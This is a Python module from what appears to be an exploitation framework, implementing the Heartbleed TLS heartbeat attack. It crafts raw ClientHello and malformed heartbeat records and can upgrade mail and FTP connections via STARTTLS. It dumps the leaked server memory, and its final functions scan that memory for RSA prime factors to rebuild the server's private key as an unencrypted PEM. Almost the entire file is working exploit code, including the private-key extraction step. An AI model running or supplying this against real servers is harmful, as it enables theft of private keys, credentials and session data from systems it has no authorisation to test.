#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TLS heartbeat (Heartbleed-style) probing helpers for TCP services."""

from __future__ import annotations

import re
import socket
import ssl
import struct
import subprocess
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat

try:
    from Crypto.Util.number import isPrime as _is_prime
except ImportError:  # pragma: no cover - pycryptodome is a framework dependency
    _is_prime = None

TLS_VERSIONS = {
    0x01: "TLSv1.0",
    0x02: "TLSv1.1",
    0x03: "TLSv1.2",
}

STARTTLS_PORTS = {21, 25, 110, 143, 587}
TLS_CONTENT_HANDSHAKE = 22
TLS_CONTENT_ALERT = 21
TLS_CONTENT_HEARTBEAT = 24
TLS_HANDSHAKE_SERVER_HELLO = 0x0E

LogFn = Callable[[str], None]


@dataclass
class HeartbleedProbeResult:
    vulnerable: bool
    tls_version: str = ""
    leaked_bytes: int = 0
    payload: bytes = b""
    reason: str = ""


def _noop_log(_message: str) -> None:
    return None


def build_client_hello(tls_ver: int) -> bytes:
    """Return a minimal ClientHello for the given TLS record version byte."""
    body = [
        0x16,
        0x03,
        tls_ver,
        0x00,
        0xDC,
        0x01,
        0x00,
        0x00,
        0xD8,
        0x03,
        tls_ver,
        0x53,
        0x43,
        0x5B,
        0x90,
        0x9D,
        0x9B,
        0x72,
        0x0B,
        0xBC,
        0x0C,
        0xBC,
        0x2B,
        0x92,
        0xA8,
        0x48,
        0x97,
        0xCF,
        0xBD,
        0x39,
        0x04,
        0xCC,
        0x16,
        0x0A,
        0x85,
        0x03,
        0x90,
        0x9F,
        0x77,
        0x04,
        0x33,
        0xD4,
        0xDE,
        0x00,
        0x00,
        0x66,
        0xC0,
        0x14,
        0xC0,
        0x0A,
        0xC0,
        0x22,
        0xC0,
        0x21,
        0x00,
        0x39,
        0x00,
        0x38,
        0x00,
        0x88,
        0x00,
        0x87,
        0xC0,
        0x0F,
        0xC0,
        0x05,
        0x00,
        0x35,
        0x00,
        0x84,
        0xC0,
        0x12,
        0xC0,
        0x08,
        0xC0,
        0x1C,
        0xC0,
        0x1B,
        0x00,
        0x16,
        0x00,
        0x13,
        0xC0,
        0x0D,
        0xC0,
        0x03,
        0x00,
        0x0A,
        0xC0,
        0x13,
        0xC0,
        0x09,
        0xC0,
        0x1F,
        0xC0,
        0x1E,
        0x00,
        0x33,
        0x00,
        0x32,
        0x00,
        0x9A,
        0x00,
        0x99,
        0x00,
        0x45,
        0x00,
        0x44,
        0xC0,
        0x0E,
        0xC0,
        0x04,
        0x00,
        0x2F,
        0x00,
        0x96,
        0x00,
        0x41,
        0xC0,
        0x11,
        0xC0,
        0x07,
        0xC0,
        0x0C,
        0xC0,
        0x02,
        0x00,
        0x05,
        0x00,
        0x04,
        0x00,
        0x15,
        0x00,
        0x12,
        0x00,
        0x09,
        0x00,
        0x14,
        0x00,
        0x11,
        0x00,
        0x08,
        0x00,
        0x06,
        0x00,
        0x03,
        0x00,
        0xFF,
        0x01,
        0x00,
        0x00,
        0x49,
        0x00,
        0x0B,
        0x00,
        0x04,
        0x03,
        0x00,
        0x01,
        0x02,
        0x00,
        0x0A,
        0x00,
        0x34,
        0x00,
        0x32,
        0x00,
        0x0E,
        0x00,
        0x0D,
        0x00,
        0x19,
        0x00,
        0x0B,
        0x00,
        0x0C,
        0x00,
        0x18,
        0x00,
        0x09,
        0x00,
        0x0A,
        0x00,
        0x16,
        0x00,
        0x17,
        0x00,
        0x08,
        0x00,
        0x06,
        0x00,
        0x07,
        0x00,
        0x14,
        0x00,
        0x15,
        0x00,
        0x04,
        0x00,
        0x05,
        0x00,
        0x12,
        0x00,
        0x13,
        0x00,
        0x01,
        0x00,
        0x02,
        0x00,
        0x03,
        0x00,
        0x0F,
        0x00,
        0x10,
        0x00,
        0x11,
        0x00,
        0x23,
        0x00,
        0x00,
        0x00,
        0x0F,
        0x00,
        0x01,
        0x01,
    ]
    return bytes(body)


def build_malformed_heartbeat(tls_ver: int) -> bytes:
    """Malformed heartbeat claiming 0x4000 bytes while sending only 3."""
    return bytes([0x18, 0x03, tls_ver, 0x00, 0x03, 0x01, 0x40, 0x00])


def recv_tls_record(sock: socket.socket, timeout: float, log: LogFn = _noop_log) -> Tuple[Optional[int], Optional[int], bytes]:
    """Read one TLS record from *sock*."""
    previous_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    try:
        header = _recv_exact(sock, 5)
        if not header:
            return None, None, b""
        record_type, version, length = struct.unpack(">BHH", header)
        payload = _recv_exact(sock, length)
        if payload is None:
            return None, None, b""
        log(f"TLS record type={record_type} version=0x{version:04x} length={length}")
        return record_type, version, payload
    except (OSError, socket.timeout) as exc:
        log(f"TLS receive error: {exc}")
        return None, None, b""
    finally:
        sock.settimeout(previous_timeout)


def _recv_exact(sock: socket.socket, size: int) -> Optional[bytes]:
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def _recv_plain(sock: socket.socket, timeout: float, limit: int = 4096) -> bytes:
    previous_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    try:
        return sock.recv(limit) or b""
    finally:
        sock.settimeout(previous_timeout)


def _negotiate_starttls(
    sock: socket.socket,
    port: int,
    timeout: float,
    log: LogFn = _noop_log,
) -> bool:
    """Detect and issue STARTTLS/STLS/AUTH TLS on cleartext mail/FTP ports."""
    banner = _recv_plain(sock, timeout)
    if banner:
        log(banner.decode("utf-8", errors="replace").strip())

    stls = False
    auth_tls = False

    if port in {25, 587}:
        sock.sendall(b"EHLO kittysploit.local\r\n")
        reply = banner + _recv_plain(sock, timeout)
        text = reply.decode("utf-8", errors="replace")
        log(text.strip())
        if "STARTTLS" in text.upper():
            command = b"STARTTLS\r\n"
        elif "STLS" in text.upper():
            command = b"STLS\r\n"
            stls = True
        else:
            return False
    elif port in {110, 143}:
        if port == 110:
            sock.sendall(b"CAPA\r\n")
        else:
            sock.sendall(b"CAPABILITY\r\n")
        reply = banner + _recv_plain(sock, timeout)
        text = reply.decode("utf-8", errors="replace")
        log(text.strip())
        upper = text.upper()
        if "STARTTLS" in upper:
            command = b"STARTTLS\r\n"
        elif "STLS" in upper:
            command = b"STLS\r\n"
            stls = True
        else:
            return False
    elif port == 21:
        sock.sendall(b"FEAT\r\n")
        reply = banner + _recv_plain(sock, timeout)
        text = reply.decode("utf-8", errors="replace")
        log(text.strip())
        upper = text.upper()
        if "AUTH TLS" in upper:
            command = b"AUTH TLS\r\n"
            auth_tls = True
        elif "STARTTLS" in upper:
            command = b"STARTTLS\r\n"
        else:
            return False
    else:
        command = b"STARTTLS\r\n"

    label = "AUTH TLS" if auth_tls else ("STLS" if stls else "STARTTLS")
    log(f"Sending {label}...")
    sock.sendall(command)
    reply = _recv_plain(sock, timeout)
    if reply:
        log(reply.decode("utf-8", errors="replace").strip())
    return True


def negotiate_tls_version(
    sock: socket.socket,
    timeout: float,
    log: LogFn = _noop_log,
) -> Optional[int]:
    """Try TLS 1.0–1.2 ClientHello until a ServerHello is observed."""
    for tls_ver in TLS_VERSIONS:
        log(f"Sending ClientHello for {TLS_VERSIONS[tls_ver]}")
        sock.sendall(build_client_hello(tls_ver))
        while True:
            record_type, _version, message = recv_tls_record(sock, timeout, log=log)
            if record_type is None:
                break
            if record_type == TLS_CONTENT_HANDSHAKE and message and message[0] == TLS_HANDSHAKE_SERVER_HELLO:
                log(f"Received ServerHello for {TLS_VERSIONS[tls_ver]}")
                return tls_ver
            if record_type == TLS_CONTENT_ALERT:
                break
    return None


def send_heartbleed_probe(
    sock: socket.socket,
    tls_ver: int,
    timeout: float,
    log: LogFn = _noop_log,
) -> HeartbleedProbeResult:
    """Send a malformed heartbeat and classify the server response."""
    sock.sendall(build_malformed_heartbeat(tls_ver))
    while True:
        record_type, _version, payload = recv_tls_record(sock, timeout, log=log)
        if record_type is None:
            return HeartbleedProbeResult(
                vulnerable=False,
                reason="No heartbeat response received; target likely not vulnerable",
            )

        if record_type == TLS_CONTENT_HEARTBEAT:
            leaked = max(0, len(payload) - 3)
            if leaked > 0:
                return HeartbleedProbeResult(
                    vulnerable=True,
                    tls_version=TLS_VERSIONS.get(tls_ver, f"0x{tls_ver:02x}"),
                    leaked_bytes=leaked,
                    payload=payload,
                    reason="Heartbeat response returned more data than declared",
                )
            return HeartbleedProbeResult(
                vulnerable=False,
                tls_version=TLS_VERSIONS.get(tls_ver, f"0x{tls_ver:02x}"),
                reason="Server accepted heartbeat but returned no extra data",
            )

        if record_type == TLS_CONTENT_ALERT:
            return HeartbleedProbeResult(
                vulnerable=False,
                tls_version=TLS_VERSIONS.get(tls_ver, f"0x{tls_ver:02x}"),
                reason="Server returned TLS alert instead of heartbeat data",
            )


def probe_heartbleed(
    host: str,
    port: int,
    *,
    timeout: float = 10.0,
    use_starttls: bool = False,
    auto_starttls: bool = True,
    log: LogFn = _noop_log,
) -> HeartbleedProbeResult:
    """Connect, optionally upgrade with STARTTLS, handshake, and test Heartbleed."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
    except OSError as exc:
        return HeartbleedProbeResult(vulnerable=False, reason=f"Connection failed: {exc}")

    try:
        if use_starttls or (auto_starttls and port in STARTTLS_PORTS):
            if not _negotiate_starttls(sock, port, timeout, log=log):
                return HeartbleedProbeResult(
                    vulnerable=False,
                    reason="STARTTLS/STLS/AUTH TLS not supported on this service",
                )

        tls_ver = negotiate_tls_version(sock, timeout, log=log)
        if tls_ver is None:
            return HeartbleedProbeResult(vulnerable=False, reason="No supported TLS version negotiated")

        log("Sending malformed heartbeat request...")
        return send_heartbleed_probe(sock, tls_ver, timeout, log=log)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def format_leaked_ascii(payload: bytes, hexdump: bool = False) -> str:
    """Render leaked heartbeat bytes as printable ASCII or a hex dump."""
    if hexdump:
        lines = []
        for offset in range(0, len(payload), 16):
            chunk = payload[offset : offset + 16]
            hex_part = " ".join(f"{byte:02X}" for byte in chunk)
            ascii_part = "".join(chr(byte) if 32 <= byte <= 126 else "." for byte in chunk)
            lines.append(f"{offset:04x}: {hex_part:<48} {ascii_part}")
        return "\n".join(lines)

    text = "".join(
        chr(byte) if (32 <= byte <= 126 or byte in (10, 13)) else "."
        for byte in payload
    )
    return re.sub(r"\.{50,}", "", text)


def fetch_certificate_modulus(
    host: str,
    port: int,
    timeout: float = 10.0,
    *,
    use_starttls: bool = False,
    auto_starttls: bool = True,
    log: LogFn = _noop_log,
) -> Optional[int]:
    """Return the RSA modulus from the service certificate, when available."""
    if use_starttls or (auto_starttls and port in STARTTLS_PORTS):
        return _fetch_modulus_via_starttls(host, port, timeout, log=log)

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with context.wrap_socket(raw, server_hostname=host) as tls_sock:
                der = tls_sock.getpeercert(binary_form=True)
    except OSError:
        return None

    return _modulus_from_der(der)


def _modulus_from_der(der: Optional[bytes]) -> Optional[int]:
    if not der:
        return None
    try:
        cert = x509.load_der_x509_certificate(der)
        public_key = cert.public_key()
        if isinstance(public_key, rsa.RSAPublicKey):
            return public_key.public_numbers().n
    except ValueError:
        return None
    return None


def _fetch_modulus_via_starttls(
    host: str,
    port: int,
    timeout: float,
    log: LogFn = _noop_log,
) -> Optional[int]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        if not _negotiate_starttls(sock, port, timeout, log=log):
            return None
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        der = tls_sock.getpeercert(binary_form=True)
        tls_sock.close()
    except OSError:
        return None
    return _modulus_from_der(der)


def extract_rsa_private_key_pem(chunk: bytes, modulus: int) -> Optional[str]:
    """Scan leaked memory for RSA prime factors and rebuild a PEM private key."""
    if _is_prime is None or not chunk or modulus <= 0:
        return None

    keysize = modulus.bit_length() // 8
    if keysize <= 0 or len(chunk) <= keysize:
        return None

    for offset in range(0, len(chunk) - keysize):
        candidate = int.from_bytes(chunk[offset : offset + keysize], "big")
        if candidate <= 1 or candidate == modulus:
            continue
        if not _is_prime(candidate):
            continue
        if modulus % candidate != 0:
            continue

        prime_p = candidate
        prime_q = modulus // candidate
        exponent = 65537
        phi = (prime_p - 1) * (prime_q - 1)
        private_exponent = pow(exponent, -1, phi)
        private_numbers = rsa.RSAPrivateNumbers(
            p=prime_p,
            q=prime_q,
            d=private_exponent,
            dmp1=private_exponent % (prime_p - 1),
            dmq1=private_exponent % (prime_q - 1),
            iqmp=pow(prime_q, -1, prime_p),
            public_numbers=rsa.RSAPublicNumbers(exponent, modulus),
        )
        private_key: RSAPrivateKey = private_numbers.private_key()
        return private_key.private_bytes(
            encoding=Encoding.PEM,
            format=PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=NoEncryption(),
        ).decode("utf-8")

    return None


def openssl_modulus_hex(host: str, port: int, timeout: float = 15.0) -> Optional[str]:
    """Fallback modulus extraction using the system openssl binary."""
    connect_target = f"{host}:{port}"
    try:
        fetch = subprocess.run(
            [
                "openssl",
                "s_client",
                "-connect",
                connect_target,
                "-servername",
                host,
            ],
            input=b"",
            capture_output=True,
            timeout=timeout,
            check=False,
        )
        modulus = subprocess.run(
            ["openssl", "x509", "-modulus", "-noout"],
            input=fetch.stdout,
            capture_output=True,
            timeout=timeout,
            check=False,
            text=True,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None

    if modulus.returncode != 0:
        return None
    line = modulus.stdout.strip()
    if not line.startswith("Modulus="):
        return None
    return line.split("=", 1)[1].strip()
